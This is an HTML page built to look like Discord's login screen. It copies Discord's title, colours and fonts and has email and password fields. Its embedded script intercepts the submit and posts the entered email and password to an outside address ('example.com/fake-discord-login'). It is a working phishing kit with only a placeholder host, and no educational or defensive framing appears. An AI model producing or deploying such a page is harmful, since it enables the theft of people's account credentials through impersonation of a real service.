<!DOCTYPE html>
<html>
<head>
  <title>Discord</title>
  <style>
    body {
      background: #36393f; 
      color: #dcddde;
      font-family: Whitney,Helvetica Neue,Helvetica,Arial,sans-serif;
    }
    
    .login {
      width: 360px;
      padding: 8% 0 0;
      margin: auto;
    }
    
    .form {
      position: relative;
      z-index: 1;
      background: #36393f;
      max-width: 360px;
      margin: 0 auto 100px;
      padding: 45px;
      text-align: center;
      box-shadow: 0 0 20px 0 rgba(0, 0, 0, 0.2), 0 5px 5px 0 rgba(0, 0, 0, 0.24);
    }
    
    input {
      font-family: Whitney,Helvetica Neue,Helvetica,Arial,sans-serif;
      outline: 0;
      background: #f2f3f5;
      width: 100%;
      border: 0;
      margin: 0 0 15px;
      padding: 15px;
      box-sizing: border-box;
      font-size: 14px;
    }
    
    button {
      font-family: Whitney,Helvetica Neue,Helvetica,Arial,sans-serif;
      text-transform: uppercase;
      outline: 0;
      background: #7289da;
      width: 100%;
      border: 0;
      padding: 15px;
      color: #FFFFFF;
      font-size: 14px;
      cursor: pointer;
    }
    
    button:hover,.form button:active,.form button:focus {
      background: #5b6eae;
    }
  </style>
</head>

<body>
  <div class="login">
    <div class="form">
      <form id="loginForm">
        <input type="email" placeholder="Email" id="emailInput" required>
        
        <input type="password" placeholder="Password" id="passwordInput" required>
        
        <button type="submit">Login</button>
      </form>
    </div>
  </div>

  <script>
    const form = document.getElementById('loginForm');
    form.addEventListener('submit', (e) => {
      e.preventDefault();
      
      // Send form data to server
      fetch('https://example.com/fake-discord-login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          email: document.getElementById('emailInput').value,
          password: document.getElementById('passwordInput').value
        })
      });
    });
  </script>
</body>
</html>
